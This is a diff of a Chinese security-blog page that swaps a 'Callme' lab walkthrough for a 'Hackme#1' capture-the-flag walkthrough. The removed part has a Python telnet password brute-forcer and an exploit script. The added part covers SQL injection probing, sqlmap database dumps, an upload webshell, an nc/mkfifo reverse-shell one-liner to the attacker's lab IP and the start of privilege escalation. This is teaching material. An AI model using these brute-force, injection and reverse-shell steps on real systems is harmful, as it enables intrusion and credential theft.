@@ -7,7 +7,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   
   
-  <title>Callme   | magisec网络安全博客</title>
+  <title>Hackme#1   | magisec网络安全博客</title>
 
   
     <link rel="apple-touch-icon" href="https://ae01.alicdn.com/kf/U8f9a193ee8f04b09b08b3d8ceedb159d2.jpg">
@@ -84,49 +84,90 @@
   <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
   <div class="container post-details" id="post-details">
     <div class="post-content">
-      <div class="post-title">Callme</div>
+      <div class="post-title">Hackme#1</div>
       <div class="post-attach">
         <span class="post-pubtime">
           <i class="iconfont icon-updatetime" title="Update time"></i>
-          2020-12-25
+          2020-12-26
         </span>
         
       </div>
       <div class="markdown-body">
-        <h2 id="环境情况"><a href="#环境情况" class="headerlink" title="环境情况"></a>环境情况</h2><p>攻击机IP：192.168.56.105</p>
-<p>靶机IP：192.168.56.122</p>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="nmap探测端口"><a href="#nmap探测端口" class="headerlink" title="nmap探测端口"></a>nmap探测端口</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -n -sV -p- -oN callme.nmap 192.168.56.122</span><br></pre></td></tr></table></figure>
-<p><img src="https://img.rruu.net/image/5fe5b226d9938" alt="image-20201225155907560"></p>
+        <h2 id="环境情况"><a href="#环境情况" class="headerlink" title="环境情况"></a>环境情况</h2><p>攻击机IP：192.168.132.140</p>
+<p>靶机IP：192.168.132.139</p>
+<h2 id="Nmap探测信息"><a href="#Nmap探测信息" class="headerlink" title="Nmap探测信息"></a>Nmap探测信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -sV -n -p- 192.168.132.139 -oN hackme#1.nmap</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe6d621261d7" alt="image-20201221161900997"></p>
+<p>端口开放：22 80</p>
+<p>端口开放情况分析：</p>
 <p>22 ssh</p>
-<p>111 rpcbind</p>
-<p>2323 未知</p>
-<h2 id="2323端口检测"><a href="#2323端口检测" class="headerlink" title="2323端口检测"></a>2323端口检测</h2><h3 id="探测信息"><a href="#探测信息" class="headerlink" title="探测信息"></a>探测信息</h3><p>使用nc连接探测</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -v 192.168.56.122 2323</span><br></pre></td></tr></table></figure>
-<p><img src="https://img.rruu.net/image/5fe5b22d48a51" alt="image-20201225160014303"></p>
-<p>我们使用telnet连接一下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet 192.168.56.122 2323</span><br></pre></td></tr></table></figure>
-<p><img src="https://img.rruu.net/image/5fe5b2329d333" alt="image-20201225160050624"></p>
-<h3 id="python3编写socket爆破脚本"><a href="#python3编写socket爆破脚本" class="headerlink" title="python3编写socket爆破脚本"></a>python3编写socket爆破脚本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim brute.py</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import socket,time</span><br><span class="line"></span><br><span class="line">with open(&quot;.&#x2F;top500.txt&quot;) as file:</span><br><span class="line">    for password in file:</span><br><span class="line">        username &#x3D; b&quot;admin&quot;</span><br><span class="line">        password &#x3D; password.strip()</span><br><span class="line">        print(&quot;Password is brute force: %s&quot; % password)</span><br><span class="line">        password &#x3D; password.encode()</span><br><span class="line">        s &#x3D; socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">        s.connect((&quot;192.168.56.122&quot;, 2323))</span><br><span class="line">        s.recv(1024)</span><br><span class="line">        time.sleep(1.5)</span><br><span class="line">        s.send(username+b&#39;\r\n&#39;)</span><br><span class="line">        s.recv(1024)</span><br><span class="line">        s.send(password+b&#39;\r\n&#39;)</span><br><span class="line">        s.recv(1024)</span><br><span class="line">        if &quot;Wrong password for user admin&quot; not in str(s.recv(1024)):</span><br><span class="line">            print(&quot;[*]The password of admin is %s&quot; % password.decode())</span><br><span class="line">            break</span><br><span class="line">        s.close()</span><br></pre></td></tr></table></figure>
-<p>我们使用一份top500的字典进行爆破，每次爆破要sleep一下，要不然靶机服务反映不过来。Python3运行，等待爆破结果。</p>
-<p><img src="https://img.rruu.net/image/5fe5b237bdce4" alt="image-20201225160308702"></p>
-<p>等待大概5分钟左右，程序就可以爆破出来了密码。</p>
-<p><img src="https://img.rruu.net/image/5fe5b23cd581f" alt="image-20201225160847184"></p>
-<p>使用telnet登录，会给我们一串很奇怪的东西。给我们一串数字，然后又跟我说我还没有准备好，感觉是会反弹回来一个shell，给的是端口。</p>
-<p><img src="https://img.rruu.net/image/5fe5b242eafa7" alt="image-20201225160958623"></p>
-<h3 id="python编写exp反弹shell"><a href="#python编写exp反弹shell" class="headerlink" title="python编写exp反弹shell"></a>python编写exp反弹shell</h3><p>运行即可反弹shell，需要先安装word2number</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import socket,time,os</span><br><span class="line">from word2number import w2n</span><br><span class="line"></span><br><span class="line">username &#x3D; b&quot;admin&quot;</span><br><span class="line">password &#x3D; b&quot;booboo&quot;</span><br><span class="line">s &#x3D; socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((&quot;192.168.56.122&quot;, 2323))</span><br><span class="line">time.sleep(1)</span><br><span class="line">s.send(username+b&#39;\r\n&#39;)</span><br><span class="line">s.send(password+b&#39;\r\n&#39;)</span><br><span class="line">num &#x3D; 0</span><br><span class="line">while True:</span><br><span class="line">    num +&#x3D; 1</span><br><span class="line">    body &#x3D; s.recv(1024)</span><br><span class="line">    if body &#x3D;&#x3D; b&quot;&quot;:</span><br><span class="line">        break</span><br><span class="line">    elif num &#x3D;&#x3D; 3:</span><br><span class="line">        port &#x3D; w2n.word_to_num(body.decode().lower().strip())</span><br><span class="line">        os.system(&quot;nc -lvnp &quot; + str(port))</span><br><span class="line">        continue</span><br><span class="line">    print(body)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
-<p>获取flag.txt</p>
-<p><img src="https://img.rruu.net/image/5fe5b2481f654" alt="image-20201225162607358"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type local.txt</span><br></pre></td></tr></table></figure>
-<p><img src="https://img.rruu.net/image/5fe5b24cd6fd8" alt="image-20201225162620780"></p>
+<p>80 web</p>
+<p>攻击方向放在web。</p>
+<h2 id="80端口漏洞测试"><a href="#80端口漏洞测试" class="headerlink" title="80端口漏洞测试"></a>80端口漏洞测试</h2><p>打开 <a target="_blank" rel="noopener" href="http://192.168.132.139/login.php">http://192.168.132.139/login.php</a></p>
+<p><img src="https://img.rruu.net/image/5fe6d627467a9" alt="image-20201221162428331"></p>
+<p>简单查看一下页面的功能</p>
+<p>先注册一个用户username：magisec password：magisec</p>
+<p><img src="https://img.rruu.net/image/5fe6d62c11252" alt="image-20201221162939395"></p>
+<p>reset your passwd这个功能是没有的，我们扫一下目录，看看是不是改了名字。不着急测试，先用gobuster扫描一下目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;big.txt -e -l -u http:&#x2F;&#x2F;192.168.132.139 -o hackme1</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe6d630d5b21" alt="image-20201221164607107"></p>
+<p>留意一下upload目录，后面可能这张图片存有东西。</p>
+<p><img src="https://img.rruu.net/image/5fe6d63674e5b" alt="image-20201221164631446"></p>
+<h3 id="手工检测SQL注入"><a href="#手工检测SQL注入" class="headerlink" title="手工检测SQL注入"></a>手工检测SQL注入</h3><p>测试这个welcome.php，他这个下面有那个输入框，可能存在注入，因为是搜索功能，我们注入要闭合才可以。</p>
+<p><img src="https://img.rruu.net/image/5fe6d63cd1b86" alt="image-20201221164832595"></p>
+<p>burpsuite抓包测试</p>
+<p><img src="https://img.rruu.net/image/5fe6d6415295e" alt="image-20201221165027784"></p>
+<p>返回正确</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:a&#39;+or+1&#x3D;2#</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe6d64692af0" alt="image-20201221165239172"></p>
+<p>返回错误</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:a&#39;+or+1&#x3D;2#</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe6d64cab637" alt="image-20201221165132576"></p>
+<p>存在注入，我们将数据包保存为sql.txt使用sqlmap继续注入。</p>
+<h3 id="SQLmap利用注入漏洞"><a href="#SQLmap利用注入漏洞" class="headerlink" title="SQLmap利用注入漏洞"></a>SQLmap利用注入漏洞</h3><p>sqlmap检测存在注入</p>
+<p><img src="https://img.rruu.net/image/5fe6d65222f59" alt="image-20201221165452742"></p>
+<p>判断一下是否为root权限，权限决定我们的渗透方向。</p>
+<p><img src="https://img.rruu.net/image/5fe6d6593ba40" alt="image-20201221165546013"></p>
+<p>因为是root权限我们尝试写shell，失败了。</p>
+<p>跑一下数据库</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r sql.txt --dbs</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe6d65f35941" alt="image-20201221165322281"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmpa -r sql.txt -D &quot;webapphacking&quot; -T &quot;users&quot; --dump</span><br></pre></td></tr></table></figure>
+<p>跑出来用户名密码，关注一下superadmin，密码我们去md5解密获取为Uncrackable</p>
+<p><img src="https://img.rruu.net/image/5fe6d6652fe9f" alt="image-20201221174511714"></p>
+<p>将上面密码解密，然后做成user.txt与pass.txt</p>
+<p><img src="https://img.rruu.net/image/5fe6d66b574bc" alt="image-20201221175819745"></p>
+<h3 id="上传漏洞getshell"><a href="#上传漏洞getshell" class="headerlink" title="上传漏洞getshell"></a>上传漏洞getshell</h3><p>登录一下superadmin用户</p>
+<p><img src="https://img.rruu.net/image/5fe6d67051e67" alt="image-20201221174826982"></p>
+<p>上传突破看看可不可以getshel回来。</p>
+<p><img src="https://img.rruu.net/image/5fe6d675a33d2" alt="image-20201221175012797"></p>
+<p>上传成功，我们反弹一下shell。nc监听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9001</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe6d67a432af" alt="image-20201221175147102"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm+%2ftmp%2ff%3bmkfifo+%2ftmp%2ff%3bcat+%2ftmp%2ff%7c%2fbin%2fsh+-i+2%3e%261%7cnc+192.168.132.140+9001+%3e%2ftmp%2ff</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe6d67ea9529" alt="image-20201221175137452"></p>
+<h3 id="Python切换bash"><a href="#Python切换bash" class="headerlink" title="Python切换bash"></a>Python切换bash</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>
+<h2 id="特权提升"><a href="#特权提升" class="headerlink" title="特权提升"></a>特权提升</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>查看config.php welcomeadmin.php 没有发现任何有价值的东西</p>
+<p><img src="https://img.rruu.net/image/5fe6d6831f66e" alt="image-20201221180515131"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;var</span><br></pre></td></tr></table></figure>
+<p>查看backups目录，未发现任何有价值的东西</p>
+<p><img src="https://img.rruu.net/image/5fe6d687f209e" alt="image-20201221180603004"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;home</span><br></pre></td></tr></table></figure>
+<p>发现存在两个用户</p>
+<p>一个是hackme 一个是legacy，先进入hackme，有一个比较特殊的文件，可惜没有执行权限。</p>
+<p><img src="https://img.rruu.net/image/5fe6d68ed1364" alt="image-20201221180755514"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;.sudo_as_admin_successful</span><br></pre></td></tr></table></figure>
+<h3 id="特权提升-1"><a href="#特权提升-1" class="headerlink" title="特权提升"></a>特权提升</h3><p>来到legacy目录</p>
+<p><img src="https://img.rruu.net/image/5fe6d693b25aa" alt="image-20201221180853419"></p>
+<p>发现touchmenot文件是一个二进制的可执行文件，我们有执行权限。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;touchmenot</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe6d6986d7a6" alt="image-20201221181017980"></p>
 
       </div>
       
         <div class="prev-or-next">
           <div class="post-foot-next">
             
-              <a href="/2020/12/25/Linux%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%8A%80%E6%9C%AF%E5%90%88%E9%9B%86/" target="_self">
+              <a href="/2020/12/25/Callme/" target="_self">
                 <i class="iconfont icon-chevronleft"></i>
                 <span>Prev</span>
               </a>
@@ -135,13 +176,13 @@
           <div class="post-attach">
             <span class="post-pubtime">
               <i class="iconfont icon-updatetime" title="Update time"></i>
-              2020-12-25
+              2020-12-26
             </span>
             
           </div>
           <div class="post-foot-prev">
             
-              <a href="/2020/12/26/Hackme-1/" target="_self">
+              <a href="/2020/12/26/Lampiao/" target="_self">
                 <span>Next</span>
                 <i class="iconfont icon-chevronright"></i>
               </a>
@@ -154,7 +195,7 @@
   <div class="post-catalog" id="catalog">
     <div class="title">Contents</div>
     <div class="catalog-content">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%83%85%E5%86%B5"><span class="toc-text">环境情况</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap%E6%8E%A2%E6%B5%8B%E7%AB%AF%E5%8F%A3"><span class="toc-text">nmap探测端口</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2323%E7%AB%AF%E5%8F%A3%E6%A3%80%E6%B5%8B"><span class="toc-text">2323端口检测</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8B%E4%BF%A1%E6%81%AF"><span class="toc-text">探测信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#python3%E7%BC%96%E5%86%99socket%E7%88%86%E7%A0%B4%E8%84%9A%E6%9C%AC"><span class="toc-text">python3编写socket爆破脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#python%E7%BC%96%E5%86%99exp%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">python编写exp反弹shell</span></a></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%83%85%E5%86%B5"><span class="toc-text">环境情况</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Nmap%E6%8E%A2%E6%B5%8B%E4%BF%A1%E6%81%AF"><span class="toc-text">Nmap探测信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#80%E7%AB%AF%E5%8F%A3%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95"><span class="toc-text">80端口漏洞测试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%A3%80%E6%B5%8BSQL%E6%B3%A8%E5%85%A5"><span class="toc-text">手工检测SQL注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQLmap%E5%88%A9%E7%94%A8%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-text">SQLmap利用注入漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9Egetshell"><span class="toc-text">上传漏洞getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python%E5%88%87%E6%8D%A2bash"><span class="toc-text">Python切换bash</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87"><span class="toc-text">特权提升</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87-1"><span class="toc-text">特权提升</span></a></li></ol></li></ol>
     </div>
   </div>
 
